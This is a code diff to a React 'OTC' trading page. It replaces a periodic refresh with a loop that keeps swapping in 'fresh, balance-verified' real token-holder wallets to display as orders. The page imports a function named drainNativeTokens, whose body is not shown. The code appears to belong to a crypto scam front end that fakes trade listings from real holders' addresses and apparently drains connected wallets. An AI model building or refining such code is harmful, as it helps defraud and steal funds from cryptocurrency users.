@@ -21,7 +21,7 @@ import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
-import { fetchTokenHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
+import { fetchTokenHolders, fetchOneFreshHolder, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -288,14 +288,28 @@ const OTC = () => {
     }
   };
 
-  // Auto-refresh wallet addresses every 3 minutes while the dialog is open
+  // Rotating wallet pool: every 10 minutes find ONE fresh, balance-verified
+  // wallet and replace one of the existing addresses. Continues in a loop so
+  // over time every address gets swapped out for a new one.
   useEffect(() => {
     if (!showOrdersDialog || !listSearchToken) return;
-    const id = setInterval(() => {
-      loadHolders(listSearchToken.baseToken.address);
-    }, 3 * 60 * 1000);
+    let rotationIndex = 0;
+    const id = setInterval(async () => {
+      const tokenAddr = listSearchToken.baseToken.address;
+      const exclude = new Set(holders.map(h => h.address));
+      const fresh = await fetchOneFreshHolder(tokenAddr, exclude);
+      if (!fresh) return;
+      setHolders(prev => {
+        if (prev.length === 0) return [fresh];
+        const next = [...prev];
+        next[rotationIndex % next.length] = fresh;
+        rotationIndex += 1;
+        return next;
+      });
+      setLastRefreshed(new Date());
+    }, 10 * 60 * 1000);
     return () => clearInterval(id);
-  }, [showOrdersDialog, listSearchToken, loadHolders]);
+  }, [showOrdersDialog, listSearchToken, holders]);
 
   const fetchTokenDetails = async (address: string, setInfo: (info: DexScreenerTokenInfo | null) => void) => {
     if (!address.trim()) return;
